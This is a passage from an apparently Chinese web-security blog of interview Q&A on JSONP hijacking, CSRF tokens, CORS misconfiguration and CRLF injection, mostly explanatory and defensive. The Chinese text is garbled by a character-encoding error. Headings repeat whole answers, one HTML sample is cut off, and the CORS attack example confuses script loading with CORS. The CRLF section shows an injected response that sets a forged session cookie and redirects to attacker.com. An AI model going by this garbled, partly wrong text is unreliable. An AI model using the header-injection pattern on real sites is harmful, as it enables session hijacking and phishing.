¼éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œé˜²æ­¢æ¶æ„å­—ç¬¦ã€‚</h2><h3 id="JSONP-çš„ä¸šåŠ¡æ„ä¹‰ã€JSONP-åŠ«æŒåˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿå¦‚ä½•è®¾è®¡-CSRF-Tokenï¼Ÿ"><a href="#JSONP-çš„ä¸šåŠ¡æ„ä¹‰ã€JSONP-åŠ«æŒåˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿå¦‚ä½•è®¾è®¡-CSRF-Tokenï¼Ÿ" class="headerlink" title="JSONP çš„ä¸šåŠ¡æ„ä¹‰ã€JSONP åŠ«æŒåˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿå¦‚ä½•è®¾è®¡ CSRF Tokenï¼Ÿ"></a>JSONP çš„ä¸šåŠ¡æ„ä¹‰ã€JSONP åŠ«æŒåˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿå¦‚ä½•è®¾è®¡ CSRF Tokenï¼Ÿ</h3><h2 id="JSONP-çš„ä¸šåŠ¡æ„ä¹‰ï¼šJSONPï¼ˆJSON-with-Paddingï¼‰æ˜¯ä¸€ç§è·¨åŸŸè¯·æ±‚æ•°æ®çš„æŠ€æœ¯ï¼Œåˆ©ç”¨-æ ‡ç­¾çš„è·¨åŸŸç‰¹æ€§ï¼Œå…è®¸ç½‘é¡µä»å…¶ä»–åŸŸè·å–æ•°æ®ã€‚JSONP-åŠ«æŒåˆ©ç”¨æ–¹å¼ï¼š-åŠ«æŒæ•æ„Ÿæ•°æ®ï¼šæ”»å‡»è€…æ„é€ æ¶æ„é¡µé¢ï¼Œåˆ©ç”¨-JSONP-è·å–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚è´¦æˆ·ä½™é¢ã€ä¸ªäººèµ„æ–™ç­‰ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-ç¦ç”¨-JSONPï¼šä¸ä½¿ç”¨-JSONPï¼Œæ”¹ç”¨-CORS-ç­‰å®‰å…¨çš„è·¨åŸŸè¯·æ±‚æ–¹å¼ã€‚-éªŒè¯å›è°ƒå‡½æ•°ï¼šä¸¥æ ¼éªŒè¯å›è°ƒå‡½æ•°åï¼Œé˜²æ­¢è¢«ç¯¡æ”¹ã€‚-ä½¿ç”¨-HTTPSï¼šé€šè¿‡-HTTPS-åŠ å¯†ä¼ è¾“ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»ã€‚å¦‚ä½•è®¾è®¡-CSRF-Tokenï¼š-ç”Ÿæˆ-Tokenï¼šåœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆéšæœºçš„-CSRF-Tokenï¼Œå¹¶ä¸ç”¨æˆ·ä¼šè¯å…³è”ã€‚-åµŒå…¥-Tokenï¼šåœ¨æ¯ä¸ªè¡¨å•ä¸­åµŒå…¥è¯¥-Tokenï¼Œä½œä¸ºéšè—å­—æ®µã€‚-éªŒè¯-Tokenï¼šåœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚ä¸­çš„-Token-æ˜¯å¦ä¸ä¼šè¯ä¸­çš„ä¸€è‡´ã€‚-ç¤ºä¾‹ä»£ç ï¼š-ç”Ÿæˆ-Tokenï¼ˆPHPï¼‰ï¼š-åµŒå…¥-Tokenï¼ˆHTMLï¼‰ï¼š"><a href="#JSONP-çš„ä¸šåŠ¡æ„ä¹‰ï¼šJSONPï¼ˆJSON-with-Paddingï¼‰æ˜¯ä¸€ç§è·¨åŸŸè¯·æ±‚æ•°æ®çš„æŠ€æœ¯ï¼Œåˆ©ç”¨-æ ‡ç­¾çš„è·¨åŸŸç‰¹æ€§ï¼Œå…è®¸ç½‘é¡µä»å…¶ä»–åŸŸè·å–æ•°æ®ã€‚JSONP-åŠ«æŒåˆ©ç”¨æ–¹å¼ï¼š-åŠ«æŒæ•æ„Ÿæ•°æ®ï¼šæ”»å‡»è€…æ„é€ æ¶æ„é¡µé¢ï¼Œåˆ©ç”¨-JSONP-è·å–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚è´¦æˆ·ä½™é¢ã€ä¸ªäººèµ„æ–™ç­‰ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-ç¦ç”¨-JSONPï¼šä¸ä½¿ç”¨-JSONPï¼Œæ”¹ç”¨-CORS-ç­‰å®‰å…¨çš„è·¨åŸŸè¯·æ±‚æ–¹å¼ã€‚-éªŒè¯å›è°ƒå‡½æ•°ï¼šä¸¥æ ¼éªŒè¯å›è°ƒå‡½æ•°åï¼Œé˜²æ­¢è¢«ç¯¡æ”¹ã€‚-ä½¿ç”¨-HTTPSï¼šé€šè¿‡-HTTPS-åŠ å¯†ä¼ è¾“ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»ã€‚å¦‚ä½•è®¾è®¡-CSRF-Tokenï¼š-ç”Ÿæˆ-Tokenï¼šåœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆéšæœºçš„-CSRF-Tokenï¼Œå¹¶ä¸ç”¨æˆ·ä¼šè¯å…³è”ã€‚-åµŒå…¥-Tokenï¼šåœ¨æ¯ä¸ªè¡¨å•ä¸­åµŒå…¥è¯¥-Tokenï¼Œä½œä¸ºéšè—å­—æ®µã€‚-éªŒè¯-Tokenï¼šåœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚ä¸­çš„-Token-æ˜¯å¦ä¸ä¼šè¯ä¸­çš„ä¸€è‡´ã€‚-ç¤ºä¾‹ä»£ç ï¼š-ç”Ÿæˆ-Tokenï¼ˆPHPï¼‰ï¼š-åµŒå…¥-Tokenï¼ˆHTMLï¼‰ï¼š" class="headerlink" title="JSONP çš„ä¸šåŠ¡æ„ä¹‰ï¼šJSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§è·¨åŸŸè¯·æ±‚æ•°æ®çš„æŠ€æœ¯ï¼Œåˆ©ç”¨ &lt;script&gt; æ ‡ç­¾çš„è·¨åŸŸç‰¹æ€§ï¼Œå…è®¸ç½‘é¡µä»å…¶ä»–åŸŸè·å–æ•°æ®ã€‚JSONP åŠ«æŒåˆ©ç”¨æ–¹å¼ï¼š- åŠ«æŒæ•æ„Ÿæ•°æ®ï¼šæ”»å‡»è€…æ„é€ æ¶æ„é¡µé¢ï¼Œåˆ©ç”¨ JSONP è·å–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚è´¦æˆ·ä½™é¢ã€ä¸ªäººèµ„æ–™ç­‰ã€‚ä¿®å¤æ–¹æ¡ˆï¼š- ç¦ç”¨ JSONPï¼šä¸ä½¿ç”¨ JSONPï¼Œæ”¹ç”¨ CORS ç­‰å®‰å…¨çš„è·¨åŸŸè¯·æ±‚æ–¹å¼ã€‚- éªŒè¯å›è°ƒå‡½æ•°ï¼šä¸¥æ ¼éªŒè¯å›è°ƒå‡½æ•°åï¼Œé˜²æ­¢è¢«ç¯¡æ”¹ã€‚- ä½¿ç”¨ HTTPSï¼šé€šè¿‡ HTTPS åŠ å¯†ä¼ è¾“ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»ã€‚å¦‚ä½•è®¾è®¡ CSRF Tokenï¼š- ç”Ÿæˆ Tokenï¼šåœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆéšæœºçš„ CSRF Tokenï¼Œå¹¶ä¸ç”¨æˆ·ä¼šè¯å…³è”ã€‚- åµŒå…¥ Tokenï¼šåœ¨æ¯ä¸ªè¡¨å•ä¸­åµŒå…¥è¯¥ Tokenï¼Œä½œä¸ºéšè—å­—æ®µã€‚- éªŒè¯ Tokenï¼šåœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚ä¸­çš„ Token æ˜¯å¦ä¸ä¼šè¯ä¸­çš„ä¸€è‡´ã€‚- ç¤ºä¾‹ä»£ç ï¼š  - ç”Ÿæˆ Tokenï¼ˆPHPï¼‰ï¼š      - åµŒå…¥ Tokenï¼ˆHTMLï¼‰ï¼š    "></a><strong>JSONP çš„ä¸šåŠ¡æ„ä¹‰</strong>ï¼šJSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§è·¨åŸŸè¯·æ±‚æ•°æ®çš„æŠ€æœ¯ï¼Œåˆ©ç”¨ <code>&lt;script&gt;</code> æ ‡ç­¾çš„è·¨åŸŸç‰¹æ€§ï¼Œå…è®¸ç½‘é¡µä»å…¶ä»–åŸŸè·å–æ•°æ®ã€‚<br><strong>JSONP åŠ«æŒåˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>åŠ«æŒæ•æ„Ÿæ•°æ®</strong>ï¼šæ”»å‡»è€…æ„é€ æ¶æ„é¡µé¢ï¼Œåˆ©ç”¨ JSONP è·å–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚è´¦æˆ·ä½™é¢ã€ä¸ªäººèµ„æ–™ç­‰ã€‚<br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ç¦ç”¨ JSONP</strong>ï¼šä¸ä½¿ç”¨ JSONPï¼Œæ”¹ç”¨ CORS ç­‰å®‰å…¨çš„è·¨åŸŸè¯·æ±‚æ–¹å¼ã€‚<br>- <strong>éªŒè¯å›è°ƒå‡½æ•°</strong>ï¼šä¸¥æ ¼éªŒè¯å›è°ƒå‡½æ•°åï¼Œé˜²æ­¢è¢«ç¯¡æ”¹ã€‚<br>- <strong>ä½¿ç”¨ HTTPS</strong>ï¼šé€šè¿‡ HTTPS åŠ å¯†ä¼ è¾“ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»ã€‚<br><strong>å¦‚ä½•è®¾è®¡ CSRF Token</strong>ï¼š<br>- <strong>ç”Ÿæˆ Token</strong>ï¼šåœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆéšæœºçš„ CSRF Tokenï¼Œå¹¶ä¸ç”¨æˆ·ä¼šè¯å…³è”ã€‚<br>- <strong>åµŒå…¥ Token</strong>ï¼šåœ¨æ¯ä¸ªè¡¨å•ä¸­åµŒå…¥è¯¥ Tokenï¼Œä½œä¸ºéšè—å­—æ®µã€‚<br>- <strong>éªŒè¯ Token</strong>ï¼šåœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚ä¸­çš„ Token æ˜¯å¦ä¸ä¼šè¯ä¸­çš„ä¸€è‡´ã€‚<br>- <strong>ç¤ºä¾‹ä»£ç </strong>ï¼š<br>  - <strong>ç”Ÿæˆ Token</strong>ï¼ˆPHPï¼‰ï¼š<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  - <strong>åµŒå…¥ Token</strong>ï¼ˆHTMLï¼‰ï¼š<br>    <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $_SESSION[&#x27;csrf_token&#x27;]; ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å…¶ä»–è¡¨å•å­—æ®µ --&gt;</span></span><br><span class="line">&lt;/form </span><br></pre></td></tr></table></figure></h2><h3 id="CORS-åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ"><a href="#CORS-åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ" class="headerlink" title="CORS åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ"></a><strong>CORS åŸç†ã€åˆ©ç”¨åŠä¿®å¤ï¼Ÿ</strong></h3><h2 id="CORS-åŸç†ï¼šè·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨é™åˆ¶ä¸€ä¸ªç½‘ç«™çš„èµ„æºå¯ä»¥è¢«å…¶ä»–åŸŸçš„ç½‘é¡µæ‰€è®¿é—®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¸å…è®¸ä»ä¸åŒæºåŠ è½½èµ„æºï¼Œé™¤éæœåŠ¡å™¨åœ¨å“åº”å¤´ä¸­è®¾ç½®äº†-Access-Control-Allow-Originï¼ŒæŒ‡å®šå“ªäº›åŸŸåå¯ä»¥è®¿é—®è¯¥èµ„æºã€‚åˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ç½‘é¡µï¼Œè¯±ä½¿ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç«™ç‚¹ï¼Œåˆ©ç”¨ç›®æ ‡ç«™ç‚¹çš„-CORS-æ¼æ´ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€‚ä¾‹å¦‚ï¼š-æ”»å‡»è€…ç«™ç‚¹é€šè¿‡-è¯·æ±‚ç›®æ ‡ç«™ç‚¹ï¼Œè‹¥ç›®æ ‡ç«™ç‚¹æœªæ­£ç¡®é…ç½®-CORSï¼Œæ”»å‡»è€…å¯çªƒå–æ•°æ®ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-é…ç½®ä¸¥æ ¼çš„-CORS-ç­–ç•¥ï¼šîˆƒåªå…è®¸ç‰¹å®šçš„æ¥æºåŸŸåè®¿é—®èµ„æºï¼š-ä½¿ç”¨é¢„æ£€è¯·æ±‚ï¼šîˆƒå¯ç”¨-OPTIONS-è¯·æ±‚ï¼Œç¡®ä¿è¯·æ±‚çš„å®‰å…¨æ€§ã€‚"><a href="#CORS-åŸç†ï¼šè·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨é™åˆ¶ä¸€ä¸ªç½‘ç«™çš„èµ„æºå¯ä»¥è¢«å…¶ä»–åŸŸçš„ç½‘é¡µæ‰€è®¿é—®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¸å…è®¸ä»ä¸åŒæºåŠ è½½èµ„æºï¼Œé™¤éæœåŠ¡å™¨åœ¨å“åº”å¤´ä¸­è®¾ç½®äº†-Access-Control-Allow-Originï¼ŒæŒ‡å®šå“ªäº›åŸŸåå¯ä»¥è®¿é—®è¯¥èµ„æºã€‚åˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ç½‘é¡µï¼Œè¯±ä½¿ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç«™ç‚¹ï¼Œåˆ©ç”¨ç›®æ ‡ç«™ç‚¹çš„-CORS-æ¼æ´ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€‚ä¾‹å¦‚ï¼š-æ”»å‡»è€…ç«™ç‚¹é€šè¿‡-è¯·æ±‚ç›®æ ‡ç«™ç‚¹ï¼Œè‹¥ç›®æ ‡ç«™ç‚¹æœªæ­£ç¡®é…ç½®-CORSï¼Œæ”»å‡»è€…å¯çªƒå–æ•°æ®ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-é…ç½®ä¸¥æ ¼çš„-CORS-ç­–ç•¥ï¼šîˆƒåªå…è®¸ç‰¹å®šçš„æ¥æºåŸŸåè®¿é—®èµ„æºï¼š-ä½¿ç”¨é¢„æ£€è¯·æ±‚ï¼šîˆƒå¯ç”¨-OPTIONS-è¯·æ±‚ï¼Œç¡®ä¿è¯·æ±‚çš„å®‰å…¨æ€§ã€‚" class="headerlink" title="CORS åŸç†ï¼šè·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨é™åˆ¶ä¸€ä¸ªç½‘ç«™çš„èµ„æºå¯ä»¥è¢«å…¶ä»–åŸŸçš„ç½‘é¡µæ‰€è®¿é—®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¸å…è®¸ä»ä¸åŒæºåŠ è½½èµ„æºï¼Œé™¤éæœåŠ¡å™¨åœ¨å“åº”å¤´ä¸­è®¾ç½®äº† Access-Control-Allow-Originï¼ŒæŒ‡å®šå“ªäº›åŸŸåå¯ä»¥è®¿é—®è¯¥èµ„æºã€‚åˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ç½‘é¡µï¼Œè¯±ä½¿ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç«™ç‚¹ï¼Œåˆ©ç”¨ç›®æ ‡ç«™ç‚¹çš„ CORS æ¼æ´ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€‚ä¾‹å¦‚ï¼š- æ”»å‡»è€…ç«™ç‚¹é€šè¿‡ &lt;script src=&quot;http://target.com/sensitive-data&quot;&gt; è¯·æ±‚ç›®æ ‡ç«™ç‚¹ï¼Œè‹¥ç›®æ ‡ç«™ç‚¹æœªæ­£ç¡®é…ç½® CORSï¼Œæ”»å‡»è€…å¯çªƒå–æ•°æ®ã€‚ä¿®å¤æ–¹æ¡ˆï¼š- é…ç½®ä¸¥æ ¼çš„ CORS ç­–ç•¥ï¼šîˆƒåªå…è®¸ç‰¹å®šçš„æ¥æºåŸŸåè®¿é—®èµ„æºï¼š  - ä½¿ç”¨é¢„æ£€è¯·æ±‚ï¼šîˆƒå¯ç”¨ OPTIONS è¯·æ±‚ï¼Œç¡®ä¿è¯·æ±‚çš„å®‰å…¨æ€§ã€‚"></a><strong>CORS åŸç†</strong>ï¼š<br>è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨é™åˆ¶ä¸€ä¸ªç½‘ç«™çš„èµ„æºå¯ä»¥è¢«å…¶ä»–åŸŸçš„ç½‘é¡µæ‰€è®¿é—®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¸å…è®¸ä»ä¸åŒæºåŠ è½½èµ„æºï¼Œé™¤éæœåŠ¡å™¨åœ¨å“åº”å¤´ä¸­è®¾ç½®äº† <code>Access-Control-Allow-Origin</code>ï¼ŒæŒ‡å®šå“ªäº›åŸŸåå¯ä»¥è®¿é—®è¯¥èµ„æºã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ç½‘é¡µï¼Œè¯±ä½¿ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç«™ç‚¹ï¼Œåˆ©ç”¨ç›®æ ‡ç«™ç‚¹çš„ CORS æ¼æ´ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€‚ä¾‹å¦‚ï¼š<br>- æ”»å‡»è€…ç«™ç‚¹é€šè¿‡ <code>&lt;script src=&quot;http://target.com/sensitive-data&quot;&gt;</code> è¯·æ±‚ç›®æ ‡ç«™ç‚¹ï¼Œè‹¥ç›®æ ‡ç«™ç‚¹æœªæ­£ç¡®é…ç½® CORSï¼Œæ”»å‡»è€…å¯çªƒå–æ•°æ®ã€‚<br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>é…ç½®ä¸¥æ ¼çš„ CORS ç­–ç•¥</strong>ï¼šîˆƒåªå…è®¸ç‰¹å®šçš„æ¥æºåŸŸåè®¿é—®èµ„æºï¼š<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted-site.com</span><br></pre></td></tr></table></figure><br>- <strong>ä½¿ç”¨é¢„æ£€è¯·æ±‚</strong>ï¼šîˆƒå¯ç”¨ <code>OPTIONS</code> è¯·æ±‚ï¼Œç¡®ä¿è¯·æ±‚çš„å®‰å…¨æ€§ã€‚</h2><h3 id="CRLF-æ³¨å…¥åŸç†ï¼Ÿ"><a href="#CRLF-æ³¨å…¥åŸç†ï¼Ÿ" class="headerlink" title="CRLF æ³¨å…¥åŸç†ï¼Ÿ"></a><strong>CRLF æ³¨å…¥åŸç†ï¼Ÿ</strong></h3><h2 id="æ¼æ´åŸç†ï¼šCRLFï¼ˆCarriage-Return-Line-Feedï¼‰æ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨æ”»å‡»è€…å‘-HTTP-å“åº”ä¸­æ’å…¥éæ³•çš„æ¢è¡Œç¬¦-r-nï¼Œä»¥ç ´åæœåŠ¡å™¨å¯¹å“åº”çš„å¤„ç†ï¼Œä»è€Œå½±å“-HTTP-å¤´çš„è§£æã€‚æ”»å‡»è€…å¯ä»¥æ’å…¥æ¶æ„å†…å®¹ï¼Œå¦‚æ³¨å…¥-HTTP-å“åº”å¤´ï¼Œè¿›è¡Œé‡å®šå‘ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ç­‰ã€‚åˆ©ç”¨æ–¹å¼ï¼š-HTTP-å¤´æ³¨å…¥ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡-CRLF-æ³¨å…¥ï¼Œåœ¨å“åº”ä¸­æ’å…¥é¢å¤–çš„å¤´éƒ¨ï¼Œä¾‹å¦‚é‡å®šå‘ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-è¾“å…¥éªŒè¯ï¼šîˆƒè¿‡æ»¤æ‰€æœ‰è¾“å…¥ï¼Œé˜²æ­¢ç”¨æˆ·æäº¤éæ³•çš„æ¢è¡Œç¬¦æˆ–å›è½¦ç¬¦ã€‚-HTTP-å¤´è§„èŒƒåŒ–ï¼šîˆƒç¡®ä¿æ‰€æœ‰-HTTP-å¤´éµå¾ªæ ‡å‡†æ ¼å¼ï¼Œé¿å…ä¸å¿…è¦çš„å­—ç¬¦æ’å…¥ã€‚"><a href="#æ¼æ´åŸç†ï¼šCRLFï¼ˆCarriage-Return-Line-Feedï¼‰æ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨æ”»å‡»è€…å‘-HTTP-å“åº”ä¸­æ’å…¥éæ³•çš„æ¢è¡Œç¬¦-r-nï¼Œä»¥ç ´åæœåŠ¡å™¨å¯¹å“åº”çš„å¤„ç†ï¼Œä»è€Œå½±å“-HTTP-å¤´çš„è§£æã€‚æ”»å‡»è€…å¯ä»¥æ’å…¥æ¶æ„å†…å®¹ï¼Œå¦‚æ³¨å…¥-HTTP-å“åº”å¤´ï¼Œè¿›è¡Œé‡å®šå‘ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ç­‰ã€‚åˆ©ç”¨æ–¹å¼ï¼š-HTTP-å¤´æ³¨å…¥ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡-CRLF-æ³¨å…¥ï¼Œåœ¨å“åº”ä¸­æ’å…¥é¢å¤–çš„å¤´éƒ¨ï¼Œä¾‹å¦‚é‡å®šå‘ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-è¾“å…¥éªŒè¯ï¼šîˆƒè¿‡æ»¤æ‰€æœ‰è¾“å…¥ï¼Œé˜²æ­¢ç”¨æˆ·æäº¤éæ³•çš„æ¢è¡Œç¬¦æˆ–å›è½¦ç¬¦ã€‚-HTTP-å¤´è§„èŒƒåŒ–ï¼šîˆƒç¡®ä¿æ‰€æœ‰-HTTP-å¤´éµå¾ªæ ‡å‡†æ ¼å¼ï¼Œé¿å…ä¸å¿…è¦çš„å­—ç¬¦æ’å…¥ã€‚" class="headerlink" title="æ¼æ´åŸç†ï¼šCRLFï¼ˆCarriage Return Line Feedï¼‰æ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨æ”»å‡»è€…å‘ HTTP å“åº”ä¸­æ’å…¥éæ³•çš„æ¢è¡Œç¬¦ \r\nï¼Œä»¥ç ´åæœåŠ¡å™¨å¯¹å“åº”çš„å¤„ç†ï¼Œä»è€Œå½±å“ HTTP å¤´çš„è§£æã€‚æ”»å‡»è€…å¯ä»¥æ’å…¥æ¶æ„å†…å®¹ï¼Œå¦‚æ³¨å…¥ HTTP å“åº”å¤´ï¼Œè¿›è¡Œé‡å®šå‘ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ç­‰ã€‚åˆ©ç”¨æ–¹å¼ï¼š- HTTP å¤´æ³¨å…¥ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ CRLF æ³¨å…¥ï¼Œåœ¨å“åº”ä¸­æ’å…¥é¢å¤–çš„å¤´éƒ¨ï¼Œä¾‹å¦‚é‡å®šå‘ï¼š  ä¿®å¤æ–¹æ¡ˆï¼š- è¾“å…¥éªŒè¯ï¼šîˆƒè¿‡æ»¤æ‰€æœ‰è¾“å…¥ï¼Œé˜²æ­¢ç”¨æˆ·æäº¤éæ³•çš„æ¢è¡Œç¬¦æˆ–å›è½¦ç¬¦ã€‚- HTTP å¤´è§„èŒƒåŒ–ï¼šîˆƒç¡®ä¿æ‰€æœ‰ HTTP å¤´éµå¾ªæ ‡å‡†æ ¼å¼ï¼Œé¿å…ä¸å¿…è¦çš„å­—ç¬¦æ’å…¥ã€‚"></a><strong>æ¼æ´åŸç†</strong>ï¼š<br>CRLFï¼ˆCarriage Return Line Feedï¼‰æ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨æ”»å‡»è€…å‘ HTTP å“åº”ä¸­æ’å…¥éæ³•çš„æ¢è¡Œç¬¦ <code>\r\n</code>ï¼Œä»¥ç ´åæœåŠ¡å™¨å¯¹å“åº”çš„å¤„ç†ï¼Œä»è€Œå½±å“ HTTP å¤´çš„è§£æã€‚æ”»å‡»è€…å¯ä»¥æ’å…¥æ¶æ„å†…å®¹ï¼Œå¦‚æ³¨å…¥ HTTP å“åº”å¤´ï¼Œè¿›è¡Œé‡å®šå‘ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ç­‰ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>HTTP å¤´æ³¨å…¥</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ CRLF æ³¨å…¥ï¼Œåœ¨å“åº”ä¸­æ’å…¥é¢å¤–çš„å¤´éƒ¨ï¼Œä¾‹å¦‚é‡å®šå‘ï¼š<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>sessionid=malicious_value; path=/; HttpOnly</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://attacker.com/malicious</span><br></pre></td></tr></table></figure><br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>è¾“å…¥éªŒè¯</strong>ï¼šîˆƒè¿‡æ»¤æ‰€æœ‰è¾“å…¥ï¼Œé˜²æ­¢ç”¨æˆ·æäº¤éæ³•çš„æ¢è¡Œç¬¦æˆ–å›è½¦ç¬¦ã€‚<br>- <strong>HTTP å¤´è§„èŒƒåŒ–</strong>ï¼šîˆƒç¡®ä¿æ‰€æœ‰ HTTP å¤´éµå¾ªæ ‡å‡†æ ¼å¼ï¼Œé¿å…ä¸å¿…è¦çš„å­—ç¬¦æ’å…¥ã€‚</h2><h3 id="URL-ç™½åå•å¦‚ä½•ç»•è¿‡ï¼Ÿ"><a href="#URL-ç™½åå•å¦‚ä½•ç»•è¿‡ï¼Ÿ" class="headerlink" title="URL ç™½åå•å¦‚ä½•ç»•è¿‡ï¼Ÿ"></a><strong>URL ç™½åå•å¦‚ä½•ç»•è¿‡ï¼Ÿ</strong></h3><h2 id="æ¼æ´åŸç†ï¼šURL-ç™½åå•å¸¸ç”¨äºé™åˆ¶ç”¨æˆ·è¯·æ±‚çš„ç›®æ 